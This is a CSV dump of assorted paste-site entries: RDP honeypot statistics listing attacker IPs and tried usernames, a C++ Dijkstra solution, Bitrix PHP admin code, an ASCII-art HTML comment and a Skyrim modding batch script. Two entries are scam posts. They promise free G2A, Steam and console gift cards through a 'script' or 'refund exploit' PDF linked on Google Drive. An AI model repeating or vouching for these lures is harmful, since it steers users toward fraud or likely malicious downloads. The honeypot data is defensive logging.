id,title,username,language,date,content
uZkY1VHq,2024-04-18_stats.json,rdp_snitch,JSON,Thursday 18th of April 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""161.35.33.150"": 7,
    ""103.245.237.31"": 96,
    ""152.42.196.16"": 3,
    ""152.32.183.213"": 2,
    ""205.210.31.102"": 3,
    ""58.218.204.183"": 6,
    ""152.89.198.238"": 1,
    ""87.251.75.145"": 3,
    ""202.55.135.213"": 1,
    ""167.94.145.55"": 1,
    ""185.170.144.3"": 2,
    ""36.91.222.100"": 2,
    ""194.165.16.73"": 4,
    ""118.194.236.134"": 1,
    ""116.140.196.215"": 1,
    ""192.3.101.25"": 3,
    ""45.143.201.12"": 1,
    ""194.165.16.11"": 4,
    ""103.75.185.176"": 1,
    ""198.235.24.226"": 3,
    ""188.121.107.172"": 2,
    ""62.204.41.225"": 6,
    ""36.137.3.251"": 3,
    ""134.209.63.147"": 4,
    ""165.22.159.85"": 1,
    ""27.8.44.19"": 1,
    ""112.4.139.162"": 1,
    ""123.56.20.194"": 1,
    ""45.79.208.240"": 4,
    ""205.210.31.208"": 3,
    ""185.196.220.41"": 3,
    ""45.33.63.234"": 1,
    ""193.142.146.227"": 3,
    ""103.57.220.167"": 1,
    ""213.202.230.4"": 1,
    ""107.167.82.123"": 1,
    ""87.251.75.64"": 1,
    ""188.166.253.10"": 2,
    ""190.92.175.108"": 1,
    ""198.235.24.248"": 3,
    ""80.66.76.92"": 1
  },
  ""asn"": {
    ""AS14061"": 17,
    ""AS150867"": 96,
    ""AS135377"": 3,
    ""AS396982"": 12,
    ""AS4134"": 6,
    ""AS57523"": 1,
    ""AS208091"": 5,
    ""AS63737"": 1,
    ""AS398705"": 1,
    ""AS197414"": 2,
    ""AS7713"": 2,
    ""AS48721"": 8,
    ""AS4837"": 2,
    ""AS36352"": 3,
    ""AS210950"": 1,
    ""AS135905"": 2,
    ""AS202468"": 2,
    ""AS59425"": 6,
    ""AS9808"": 3,
    ""AS56046"": 1,
    ""AS37963"": 1,
    ""AS63949"": 5,
    ""AS208046"": 6,
    ""AS24961"": 1,
    ""AS53755"": 1,
    ""Unknown"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 17,
    ""LP TECHNOLOGY ELECTRONIC COMMERCE COMPANY LIMITED"": 96,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Google LLC"": 12,
    ""Chinanet"": 6,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Xhost Internet Solutions LP"": 7,
    ""Vietserver Services Technology Company Limited"": 1,
    ""Censys, Inc."": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Flyservers S.A."": 8,
    ""China Unicom CHINA169 Network"": 1,
    ""HostPapa"": 3,
    ""TOV E-RISHENNYA"": 1,
    ""Inet software one member company limited"": 1,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 2,
    ""Horizon LLC"": 6,
    ""China Mobile"": 3,
    ""China Unicom Chongqing Province Network"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Akamai Technologies, Inc."": 5,
    ""ColocationX Ltd."": 6,
    ""INET"": 1,
    ""myLoc managed IT AG"": 1,
    ""Input Output Flood LLC"": 1,
    ""WHG Hosting Services Ltd"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 15,
    ""LP Technology Electronic Commerce Company Limited"": 96,
    ""Ucloud Information Technology"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Chinanet JS"": 6,
    ""Starcrecium Limited"": 1,
    ""Xhost Internet Solutions"": 5,
    ""VietServer Services technology company limited"": 1,
    ""Censys, Inc."": 1,
    ""Xhostis"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""Flyservers S.A"": 8,
    ""China United Network Communications Corporation Limited"": 1,
    ""Unknown"": 4,
    ""TOV VAIZ PARTNER"": 1,
    ""Inet software one member company limited"": 1,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 2,
    ""Horizon LLC"": 6,
    ""China Mobile Communications Corporation"": 4,
    ""Aliyun Computing Co., LTD"": 1,
    ""Linode"": 5,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""iNET Media Company Limited"": 1,
    ""myLoc managed IT AG"": 1,
    ""DemonVPS"": 1,
    ""Digitalocean"": 2,
    ""WHG Hosting Services Ltd"": 1
  },
  ""regionName"": {
    ""England"": 7,
    ""Ho Chi Minh"": 96,
    ""South West"": 5,
    ""Virginia"": 5,
    ""California"": 18,
    ""Jiangsu"": 7,
    ""Moscow"": 7,
    ""North Holland"": 10,
    ""Hanoi"": 2,
    ""Hesse"": 1,
    ""Jakarta"": 2,
    ""Kaunas"": 8,
    ""Tokyo"": 1,
    ""Beijing"": 2,
    ""New York"": 3,
    ""Kyiv City"": 1,
    ""B\u1eafc Ninh Province"": 1,
    ""Tehran"": 2,
    ""Guangdong"": 3,
    ""Chongqing"": 1,
    ""Georgia"": 4,
    ""North Rhine-Westphalia"": 1,
    ""Arizona"": 1,
    ""Ohio"": 1
  },
  ""country"": {
    ""United Kingdom"": 7,
    ""Vietnam"": 99,
    ""Singapore"": 5,
    ""United States"": 32,
    ""China"": 13,
    ""Russia"": 7,
    ""The Netherlands"": 10,
    ""Germany"": 2,
    ""Indonesia"": 2,
    ""Lithuania"": 8,
    ""Japan"": 1,
    ""Ukraine"": 1,
    ""Iran"": 2
  },
  ""account"": {
    ""hello"": 126,
    ""Administrator"": 3,
    ""ZOhgeZiIR"": 1,
    ""mNXxUj"": 1,
    ""sCdJml"": 1,
    ""Test"": 14,
    ""Administr"": 8,
    ""(empty)"": 3,
    ""Domain"": 13,
    ""RMBkcrQQm"": 1,
    ""uEKmTR"": 1,
    ""uKHTXF"": 1,
    ""gqcc7yzm"": 4,
    ""beio"": 2,
    ""qqy2jyhn"": 4,
    ""WCYvQbrfk"": 1,
    ""DynGoX"": 1,
    ""vfzIKQ"": 1,
    ""ovZXmxRtw"": 1,
    ""tWBqvO"": 1,
    ""QGzYoK"": 1
  },
  ""keyboard"": {
    ""Unknown"": 189
  },
  ""client_build"": {
    ""Unknown"": 189
  },
  ""client_name"": {
    ""Unknown"": 189
  },
  ""ip_type"": {
    ""hosting"": 34,
    ""Unknown"": 136,
    ""hosting & proxy"": 11,
    ""proxy"": 1,
    ""mobile"": 7
  }
}"
buvn8LFq,Dijkstra Algorithm using Priority Queue,sachin-yadav,C++,Thursday 18th of April 2024 07:02:55 PM CDT,"#include<bits/stdc++.h>
// #include<iostream>
using namespace std;
typedef long long ll;
ll const INF=1e15;

void dijkstra(ll N, ll M, ll S, vector<pair<ll, ll>> adj_list[], vector<ll> &dist)
{
	// distance, node_id
	priority_queue<pair<ll,ll>, vector<pair<ll,ll>>, greater<pair<ll,ll>>> pq;
	dist[S] = 0;
	pq.push({0, S});
	while(! pq.empty())
	{
		pair<ll, ll> front_pair = pq.top();
		pq.pop();

		ll curr_dist = front_pair.first;
		ll curr_node = front_pair.second;

		for (auto &ed: adj_list[curr_node])
		{
			ll neigh_node = ed.first;
			ll neigh_dist = curr_dist + ed.second;
			
			if (dist[neigh_node] > neigh_dist)
			{
				dist[neigh_node] = neigh_dist;
				pq.push({dist[neigh_node], neigh_node});
			}
		}
	}
}



int main()
{
    ll T, N, M, S;
    cin >> T;
		while (T--){
			cin >> N >> M;
			vector<pair<ll, ll>> adj_list[N];
			for (ll i = 0; i < M; ++i)
			{
			ll x, y, dist;
			cin >> x >> y >> dist;
			adj_list[x-1].push_back({y-1, dist});
			adj_list[y-1].push_back({x-1, dist});
			}
		cin >> S;
		--S;
		vector<ll> dist(N + 1, INF);
		dijkstra(N, M, S, adj_list, dist);
		for(int i=0; i < N; ++i)
		{
			if (dist[i] >= INF) dist[i] = -1;		
			if (i != S)  cout << dist[i] << "" "";
		}
		cout << ""\n"";
    }
    return 0;
}"
NqnLYW7W,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 18th of April 2024 06:54:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
19 April 2024"
6gKKi8tQ,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 18th of April 2024 06:46:00 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_412631.pdf

Working as of:
18 April 2024"
i9PSU80W,Untitled,keeglo,HTML 5,Thursday 18th of April 2024 05:03:25 PM CDT,"<!--
JJJJJJJJJJJJJJJJJJ       JJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ      JJJJJ       JJJJJ      JJJJJJJJJJJJJJJJJJJ     JJJJ          JJJJJ      JJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJ        JJJJJJJJJJJJJJJJJ      JJJJJJJ     JJJJJJJ     
JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJJJJJJJJJJJJ      JJJJJ        JJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJ     JJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ             JJJJJJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJ      JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ     JJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ            JJJJJJJJJJJ      JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ    JJJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ     JJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ           JJJJJJJJJJJ       JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJJ  JJJJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ     JJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ          JJJJJJJJJJJ        JJJJJJJ     JJJJJJJ     JJJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ         JJJJJJJJJJJ         JJJJJJJ     JJJJJJJ     JJJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJ          JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ        JJJJJJJJJJJ          JJJJJJJ     JJJJJJJ     JJJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJ        JJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ       JJJJJJJJJJJ           JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJ JJJJJJJJ JJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ     JJJJJJJ     JJJJJJJ     
            JJJJJJJ     JJJJJJJ     JJJJJJJ      JJJJJJJJJJJ            JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJ  JJJJJJ  JJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ     JJJJJJJ     JJJJJJJ     
JJJJ        JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJJJJJ             JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJ   JJJJ   JJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ                 JJJJJJJ     JJJJJJJ     JJJJJJJ     
JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJJJJJJJJJJJJ      JJJJ    JJ    JJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJJJJJJJJJJJJJ     JJJJJJJ     JJJJJJJ     
 JJJJJJJJJJJJJJJJJ       JJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJ      JJJJJJJJJJJJJJJJJJJ     JJJJ          JJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ     JJJJJJJ      JJJJJJJJJJJJJJJJJ      JJJJJJJ     JJJJJJJ     

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

author: https://about.me/jozuemarsh
-->"
gVtDxPC5,Untitled,toorr2p,PHP,Thursday 18th of April 2024 04:40:28 PM CDT,"<?php
namespace Itscript\Question;

use Bitrix\Main\UserTable;
use Bitrix\Main\Type\Date;
use Bitrix\Main\Type\DateTime;
use Bitrix\Main\Localization\Loc;
use Bitrix\Main\ORM\Fields\StringField;
use Bitrix\Main\ORM\Fields\IntegerField;
use Bitrix\Main\ORM\Fields\BooleanField;
use Bitrix\Main\ORM\Fields\DateField;
use Bitrix\Main\Entity\Validator\Length;
use Bitrix\Main\ORM\Fields\Relations\Reference;
use Bitrix\Main\ORM\Data\DataManager;
use Bitrix\Main\ORM\Query\Join;

class QuestionTable extends DataManager
{
	public static function getMap()
	{
		return [
			new IntegerField('ID', [
				'title' => 'ID',
				'primary' => true,
				'autocomplete' => true
            ]),

			new IntegerField('USER_ID', [
				'title' => Loc::getMessage('QUESTION_TABLE_TITLE_USER_ID'),
				'required' => true,
				'format' => '/^[0-9]{1,}$/',
            ]),

			(new Reference(
					'USER',
					UserTable::class,
					Join::on('this.USER_ID', 'ref.ID')
			))->configureJoinType('inner'),

			new IntegerField('ENTITY_ID', [
				'title' => Loc::getMessage('QUESTION_TABLE_TITLE_ENTITY_ID'),
				'required' => true,
				'format' => '/^[0-9]{1,}$/',
            ]),

            new BooleanField('ACTIVE', [
				'title' => Loc::getMessage('QUESTION_TABLE_TITLE_ACTIVE'),
                'values' => array('N', 'Y')
            ]),

			new StringField('URL', [
				'title' => Loc::getMessage('QUESTION_TABLE_TITLE_URL'),
                'required' => true,
				'size' => 1000,
				'validation' => function () {
					return [
						new Length(null, 1000),
					];
				},
            ]),

			new StringField('QUESTION', [
				'title' => Loc::getMessage('QUESTION_TABLE_TITLE_QUESTION'),
                'required' => true,
				'size' => 8000,
				'validation' => function () {
					return [
						new Length(null, 8000),
					];
				},
            ]),

			new DateField('PUBLISH_DATE', [
				'title' => Loc::getMessage('QUESTION_TABLE_TITLE_PUBLISH_DATE'),
				'default_value' => new DateTime
			])
        ];
	}
}"
jRjT4mzA,Untitled,toorr2p,PHP,Thursday 18th of April 2024 04:39:53 PM CDT,"<?php require_once($_SERVER[""DOCUMENT_ROOT""].""/bitrix/modules/main/include/prolog_admin_before.php"");

use Bitrix\Main;
use Bitrix\Main\Loader;
use Bitrix\Main\Localization\Loc; 
use Bitrix\Main\Config\Option;
use Bitrix\Main\Application;
use Itscript\Question\QuestionTable;
use Bitrix\Main\UI\PageNavigation;

$module_id = ""itscript.question"";

IncludeModuleLangFile(__FILE__);

// Check access
$FORM_RIGHT = $APPLICATION->GetGroupRight($module_id);
if($FORM_RIGHT<=""D"") $APPLICATION->AuthForm(Loc::getMessage(""ACCESS_DENIED""));

if(!Loader::includeModule($module_id)){
	CAdminMessage::ShowMessage(Loc::getMessage(""ITSCRIPT_QUESTION_INCLUDE_MODULE_ERROR"", ['#MODULE_ID#' => $module_id]));
}

require($_SERVER[""DOCUMENT_ROOT""].""/bitrix/modules/main/include/prolog_admin_after.php"");

CUtil::InitJSCore(array($module_id));

require_once($_SERVER[""DOCUMENT_ROOT""].""/bitrix/modules/main/include/prolog_admin_before.php"");
require_once(dirname(__FILE__).""/../include.php"");
require_once(dirname(__FILE__).""/../prolog.php"");

global $APPLICATION;

$adminListTableID = 'b_itscript_question';

$adminSort = new CAdminSorting($adminListTableID, 'ID', 'ASC');
$adminList = new CAdminUiList($adminListTableID, $adminSort);

$filterFields = array(
    array(
        ""id"" => ""ID"",
        ""name"" => 'ID',
        ""filterable"" => ""="",
        ""default"" => true
    ),
    array(
        ""id"" => """",
        ""name"" => Loc::getMessage(""ITSCRIPT_QUESTION_ENTITY_ID_ADMIN_FILTER""),
        ""type"" => ""int"",
        ""filterable"" => ""=""
    ),
);

$filter = array();

$adminList->AddFilter($filterFields, $filter);

if ($listID = $adminList->GroupAction()) {

    $action = $_REQUEST['action'];

    if (!empty($_REQUEST['action_button'])) {
        $action = $_REQUEST['action_button'];
    }

    $checkUseCoupons = ($action == 'delete');
    $discountList = array();

    if ($_REQUEST['action_target'] == 'selected') {
        $listID = array();
        $formIterator = QuestionTable::getList(array(
            'select' => array('ID'),
            'filter' => $filter
        ));
        while ($form = $formIterator->fetch()) {
            $listID[] = $form['ID'];
        }
        unset($form, $formIterator);
    }

    if ($adminList->IsGroupActionToAll()) {
        $arID = array();
        $formIterator = QuestionTable::getList(array(
            'select' => array('ID'),
            'filter' => $filter
        ));
        while ($arRes = $formIterator->fetch()) {
            $listID[] = $arRes['ID'];
        }
        unset($arRes, $rsData);
    }

    $listID = array_filter($listID);

    if (!empty($listID)) {
        switch ($action) {
            case 'delete':
                foreach ($listID as &$recordId) {
                    $result = QuestionTable::delete($recordId);
                    if (!$result->isSuccess()) {
                        $adminList->AddGroupError(implode('<br>', $result->getErrorMessages()), $recordId);
                    }
                    unset($result);
                }
                unset($recordId);
                break;
        }
    }
    unset($discountList, $action, $listID);

    if ($adminList->hasGroupErrors()) {
        $adminSidePanelHelper->sendJsonErrorResponse($adminList->getGroupErrors());
    } else {
        $adminSidePanelHelper->sendSuccessResponse();
    }
}

$headerList = array();
$headerList['ID'] = array(
    'id' => 'ID',
    'content' => 'ID',
    'sort' => 'ID',
    'default' => true
);
$headerList['PUBLISH_DATE'] = array(
    'id' => 'PUBLISH_DATE',
    'content' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_PUBLISH_DATE'),
    'title' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_PUBLISH_DATE'),
    'sort' => 'CREATED',
    'default' => true
);
$headerList['QUESTION'] = array(
    'id' => 'QUESTION',
    'content' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_QUESTION'),
    'title' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_QUESTION'),
    'sort' => 'QUESTION',
    'default' => false
);
$headerList['ACTIVE'] = array(
    'id' => 'ACTIVE',
    'content' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_ACTIVE'),
    'title' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_ACTIVE'),
    'sort' => 'ACTIVE',
    'default' => false
);
$headerList['URL'] = array(
    'id' => 'URL',
    'content' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_URL'),
    'title' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_URL'),
    'sort' => 'URL',
    'default' => true
);
$headerList['ENTITY_ID'] = array(
    'id' => 'ENTITY_ID',
    'content' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_ENTITY_ID'),
    'title' => Loc::getMessage('ITSCRIPT_QUESTION_TITLE_ENTITY_ID'),
    'sort' => 'ENTITY_ID',
    'default' => true
);

$listHeader = array_keys($headerList);

$adminList->AddHeaders($headerList);

$selectFields = array_fill_keys($adminList->GetVisibleHeaderColumns(), true);
$selectFields['ID'] = true;
$selectFieldsMap = array_fill_keys(array_keys($headerList), false);
$selectFieldsMap = array_merge($selectFieldsMap, $selectFields);

if (!isset($by)) {
    $by = 'ID';
}
if (!isset($order)) {
    $order = 'ASC';
}

$rowList = array();
$usePageNavigation = true;
$navyParams = array();

$navyParams = \CDBResult::GetNavParams(CAdminUiResult::GetNavSize($adminListTableID));
if ($navyParams['SHOW_ALL']) {
    $usePageNavigation = false;
} else {
    $navyParams['PAGEN'] = (int)$navyParams['PAGEN'];
    $navyParams['SIZEN'] = (int)$navyParams['SIZEN'];
}

global $by, $order;

$getListParams = array(
    'select' => $selectFields,
    'filter' => $filter,
    'order' => array($by => $order)
);

if ($usePageNavigation) {
    $getListParams['limit'] = $navyParams['SIZEN'];
    $getListParams['offset'] = $navyParams['SIZEN'] * ($navyParams['PAGEN'] - 1);
}
$totalPages = 0;
if ($usePageNavigation) {
    $totalCount = QuestionTable::getCount($getListParams['filter']);
    if ($totalCount > 0) {
        $totalPages = ceil($totalCount / $navyParams['SIZEN']);
        if ($navyParams['PAGEN'] > $totalPages)
            $navyParams['PAGEN'] = $totalPages;
        $getListParams['limit'] = $navyParams['SIZEN'];
        $getListParams['offset'] = $navyParams['SIZEN'] * ($navyParams['PAGEN'] - 1);
    } else {
        $navyParams['PAGEN'] = 1;
        $getListParams['limit'] = $navyParams['SIZEN'];
        $getListParams['offset'] = 0;
    }
}

$getListParams['select'] = array_keys($getListParams['select']);

echo '<pre>';
print_r([
    $totalCount,
    $navyParams,
    $selectFieldsMap,
    $adminListTableID,
    'getListParams' => $getListParams,
    LANGUAGE_ID
]);
//print_r([$getListParams, $adminListTableID]);
echo '</pre>';


$formIterator = new CAdminUiResult(QuestionTable::getList($getListParams), $adminListTableID);
if ($usePageNavigation) {
    $formIterator->NavStart($getListParams['limit'], $navyParams['SHOW_ALL'], $navyParams['PAGEN']);
    $formIterator->NavRecordCount = $totalCount;
    $formIterator->NavPageCount = $totalPages;
    $formIterator->NavPageNomer = $navyParams['PAGEN'];
} else {
    $formIterator->NavStart();
}
$onlyDel = false;
$yesNo = [
    Loc::getMessage(""ITSCRIPT_QUESTION_TITLE_NO""),
    Loc::getMessage(""ITSCRIPT_QUESTION_TITLE_YES""),
];
CTimeZone::Disable();
$adminList->SetNavigationParams($formIterator, array(""BASE_LINK"" => $selfFolderUrl . ""itscript_question_list.php""));
while($form = $formIterator->fetch()) {
    $result[]=$form;
}
$prm['SELECT'] = $getListParams['select'];
//TenderComp::reflection($result, $prm);

foreach($result as $form)
{
    $form['ID'] = (int)$form['ID'];
    $urlEdit = $selfFolderUrl . 'itscript_question_edit.php?ID=' . $form['ID'] . '&lang=' . LANGUAGE_ID;
    $urlEdit = $adminSidePanelHelper->editUrlToPublicPage($urlEdit);

    $rowList[$form['ID']] = $row = &$adminList->AddRow(
        $form['ID'],
        $form,
        $urlEdit,
        Loc::getMessage(""ITSCRIPT_QUESTION_EDIT"")
    );

    if ($onlyDel) {
        $row->AddViewField('ID', $form['ID']);
    } else {
        $row->AddViewField('ID', '<a href=""' . $urlEdit . '"">' . $form['ID'] . '</a>');
    }

    if ($selectFieldsMap['URL']) {
        $row->AddViewField('URL', '<a href=""' . $form['URL'] . '"">' . $form['URL'] . '</a>');
    }

    if ($selectFieldsMap['QUESTION']) {
        $row->AddViewField('QUESTION', $form['QUESTION']);
    }
    
    if ($selectFieldsMap['PUBLISH_DATE']) {
        $row->AddViewField('PUBLISH_DATE', $form['PUBLISH_DATE']->format('d.m.Y H:i:s'));
    }

    if ($selectFieldsMap['ACTIVE']) {
        $row->AddViewField('ACTIVE', $yesNo[$form['ACTIVE']]);
    }

    $actions = array();
    if (!$onlyDel) {
        $actions[] = array(
            'ICON' => 'edit',
            'TEXT' => Loc::getMessage(""ITSCRIPT_QUESTION_EDIT""),
            'LINK' => $urlEdit,
            'DEFAULT' => true
        );
    }
    if (!$readOnly) {
        $actions[] = array(
            'ICON' => 'delete',
            'TEXT' => Loc::getMessage(""ITSCRIPT_QUESTION_DELETE""),
            'ACTION' => ""if (confirm('"" . Loc::getMessage(""ITSCRIPT_QUESTION_DELETE_ALERT"") . ""')) "" . $adminList->ActionDoGroup($form['ID'], 'delete')
        );
    }
    $row->AddActions($actions);
    unset($actions, $row);
}
CTimeZone::Enable();

$adminList->AddGroupActionTable([
    'delete' => true,
    'for_all'=>true,

]);

$contextMenu = array();

if (!$readOnly) {
    $addUrl = $selfFolderUrl . ""itscript_question_edit.php?lang="" . LANGUAGE_ID;
    $addUrl = $adminSidePanelHelper->editUrlToPublicPage($addUrl);
    $contextMenu[] = array(
        'ICON' => 'btn_new',
        'TEXT' => Loc::getMessage('ITSCRIPT_QUESTION_ADD'),
        'TITLE' => Loc::getMessage('ITSCRIPT_QUESTION_ADD'),
        'LINK' => $addUrl
    );
}

if (!empty($contextMenu)) {
    $adminList->setContextSettings(array(""pagePath"" => $selfFolderUrl . ""itscript_question_list.php""));
    $adminList->AddAdminContextMenu($contextMenu);
}


$adminList->CheckListMode();

$APPLICATION->SetTitle(Loc::getMessage(""ITSCRIPT_QUESTION_PAGE_TITLE""));

$adminList->DisplayFilter($filterFields);
$adminList->DisplayList();

require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/modules/main/include/epilog_admin.php');
"
14w9p83k,R88_ESLify.bat Both SSEedit and auto launch SSE,Lart_Iste,Batch,Thursday 18th of April 2024 04:34:52 PM CDT,"@echo off
chcp 65001 > nul 2>&1
setlocal EnableExtensions EnableDelayedExpansion

set hasSSEEdit=0
set hasXEdit=0
set hasAnyEdit=1
set hasESLifyScript=0
set hasMXPF==0
set hasMTEFunctions==0
set ""pathSSEEdit404=%CD%\SSEEdit404.exe""
set ""pathSSEEdit=%CD%\SSEEdit.exe""

IF EXIST ""SSEEdit404.exe"" set hasSSEEdit=1
IF NOT EXIST ""SSEEdit404.exe"" set hasAnyEdit=0
IF EXIST ""Edit Scripts\R88_ESLify.pas"" set hasESLifyScript=1
IF EXIST ""Edit Scripts\lib\mxpf.pas"" set hasMXPF=1
IF EXIST ""Edit Scripts\lib\mteFunctions.pas"" set hasMTEFunctions=1

echo :
echo :
echo ::: ""Ruddy88's ESLify Utility"" :::
echo ::: ""Utilitaire ESLify de Ruddy88"" :::
echo :
echo :
echo ::: Checking for required files :::
echo ::: Vérification des fichiers requis :::
echo :
echo :

for /f ""delims="" %%v in ('powershell ""(Get-Item '%pathSSEEdit404%' -ErrorAction SilentlyContinue).VersionInfo.ProductVersion""') do (
    set ""verSSEEdit404=[1;34m%%v[0m""
)
for /f ""delims="" %%v in ('powershell ""(Get-Item '%pathSSEEdit%' -ErrorAction SilentlyContinue).VersionInfo.ProductVersion""') do (
    set ""verSSEEdit=[1;34m%%v[0m""
)

echo %verSSEEdit404%
if not defined verSSEEdit404 (
	echo :::  Unable to retrieve SSEEdit version, rename SSEedit.exe 4.0.4 to SSEedit404.exe and place it in %pathSSEEdit% with the other binaries.
	echo :::  Impossible de récupérer la version de SSEEdit, renommer SSEedit.exe 4.0.4 en SSEedit404.exe et placez le dans %pathSSEEdit% avec les autres binaires.
	pause
) else (
    if ""%verSSEEdit404%"" neq ""4.0.4.0"" (
		goto :launch
    ) else (
		echo :::  Wrong version of SSEEdit, rename SSEedit.exe 4.0.4 to SSEedit404.exe and place it in %pathSSEEdit% with the other binaries.
		echo :::  Mauvaise version de SSEEdit, renommer SSEedit.exe 4.0.4 en SSEedit404.exe et placez le dans %pathSSEEdit% avec les autres binaires.
		pause
    )
)

IF %hasSSEEdit%==1 (
		echo ::: SSEEdit found
		echo ::: SSEEdit trouvé
)
IF %hasAnyEdit%==0 (
		echo ::: WARNING: XEdit/SSEEdit404.exe not found
		echo ::: Avertissement: XEdit/SSEEdit404.exe introuvable
)

IF %hasESLifyScript%==1 (
    echo ::: R88_ESLify.pas found
) ELSE (
    echo ::: WARNING: R88_ESLify.pas not found
    echo ::: Avertissement: R88_ESLify.pas introuvable
)

IF %hasMXPF%==1 (
    echo ::: mxpf.pas found
) ELSE (
    echo ::: WARNING: mxpf.pas not found
    echo ::: Avertissement: mxpf.pas introuvable
)

IF %hasMTEFunctions%==1 (
    echo ::: mteFunctions.pas found
) ELSE (
    echo ::: WARNING: mteFunctions.pas not found
    echo ::: Avertissement: mteFunctions.pas introuvable
)

IF %hasAnyEdit%==1 IF %hasESLifyScript%==1 IF %hasMXPF%==1 IF %hasMTEFunctions%==1 set hasRequiredFiles=1
IF %hasRequiredFiles%==1 (
    echo :
    echo :
    echo ::: All required files installed.
    echo ::: Tous les fichiers requis installés.
		echo :
		echo :
		%game%
) ELSE (
    echo :
    echo :
    echo ::: Required files not found. Terminating process.echo
    echo ::: Fichiers requis introuvables. Terminer le processus.
    echo :
    echo :
    pause
    exit
)

:runPatchSSE
echo :
echo :
echo ::: Skyrim SE auto selected...
echo ::: Skyrim SE auto seléctionné...
echo :
echo :
echo ::: Launching ESLify script...
echo ::: Lancement du script ESLify ...
echo :
echo :
IF %hasSSEEdit%==1 (
start SSEEdit404.exe -nobuildrefs -autoload -pseudoESL -script:""R88_ESLify.pas""
) ELSE (
    echo :
    echo :
    echo ::: Unexpected Error. Terminating process.
    echo ::: Erreur inattendue. Terminer le processus.
    echo :
    echo :
    pause
    exit
)
goto :exitPatch

:exitPatch
endlocal
exit"
